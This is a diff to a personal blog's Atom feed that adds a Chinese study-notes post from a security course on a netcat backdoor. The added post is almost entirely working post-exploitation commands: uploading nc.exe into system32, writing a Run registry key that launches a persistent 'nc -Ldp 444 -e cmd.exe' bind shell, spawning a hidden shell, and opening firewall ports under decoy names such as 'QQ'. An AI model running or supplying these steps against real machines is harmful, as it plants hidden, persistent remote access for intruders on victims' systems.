@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://www.fangmingxuan.com/"/>
-  <updated>2020-05-14T03:37:15.707Z</updated>
+  <updated>2020-05-15T02:54:54.347Z</updated>
   <id>http://www.fangmingxuan.com/</id>
   
   <author>
@@ -21,9 +21,9 @@
     <link href="http://www.fangmingxuan.com/2020/05/T3sec%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%93%E7%AC%AC%E5%85%AB%E8%AE%B2-nc%E5%90%8E%E9%97%A8/"/>
     <id>http://www.fangmingxuan.com/2020/05/T3sec%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%93%E7%AC%AC%E5%85%AB%E8%AE%B2-nc%E5%90%8E%E9%97%A8/</id>
     <published>2020-05-14T02:54:31.689Z</published>
-    <updated>2020-05-14T03:37:15.707Z</updated>
+    <updated>2020-05-15T02:54:54.347Z</updated>
     
-    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="T3SEC-—–第八讲-nc后门"><a href="#T3SEC-—–第八讲-nc后门" class="headerlink" title="T3SEC —–第八讲:nc后门"></a>T3SEC —–第八讲:nc后门</h1>    <div id="aplayer-ywLhjpLs" class="aplayer aplayer-tag-marker meting-tag-marker"         data-id="2111364820" data-server="tencent" data-type="playlist" data-mode="circulation" data-autoplay="true" data-mutex="true" data-listmaxheight="200px" data-preload="auto" data-theme="#FF4081"    ></div><p>隐藏后门</p>]]></content>
+    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="T3SEC-—–第八讲-nc后门"><a href="#T3SEC-—–第八讲-nc后门" class="headerlink" title="T3SEC —–第八讲:nc后门"></a>T3SEC —–第八讲:nc后门</h1>    <div id="aplayer-zvrqojSJ" class="aplayer aplayer-tag-marker meting-tag-marker"         data-id="2111364820" data-server="tencent" data-type="playlist" data-mode="circulation" data-autoplay="true" data-mutex="true" data-listmaxheight="200px" data-preload="auto" data-theme="#FF4081"    ></div><p>隐藏后门</p><h1 id="1-nc后门上传"><a href="#1-nc后门上传" class="headerlink" title="1.nc后门上传"></a>1.nc后门上传</h1><ul><li>upload/root/nc.exe c:\\windows\system32</li></ul><h1 id="2-修改注册表"><a href="#2-修改注册表" class="headerlink" title="2.修改注册表"></a>2.修改注册表</h1><ul><li>reg enumkey -k<ul><li>HKLM\softfware\microsoft\windows\currentversion\run</li></ul></li><li>reg setval -k HKLM\software\microsoft\windows\currentversion\run -v nc -d ‘C:\Windows\system32\nc.exe -Ldp 444 -e cmd.exe’  //添加nc键值</li><li>reg queryval -k<ul><li>HKLM\software\microsoft\windows\currentversion\run -v nc  //查看</li></ul></li></ul><h1 id="3-防火墙-允许端口"><a href="#3-防火墙-允许端口" class="headerlink" title="3.防火墙 允许端口"></a>3.防火墙 允许端口</h1><ul><li>execute -f cmd -i -H //生成shell</li><li>cmd: netsh firewall show opmode  //查看防火墙状态.</li><li>netsh firewall add portopening tcp 444 “textx” ENABLE ALL</li><li>netsh firewall add portopening TCP 4444 “FireWall” ENABLE ALL</li><li>netsh firewall add portopening TCP 7776 “QQ” ENABLE ALL</li></ul>]]></content>
     
     <summary type="html">
     
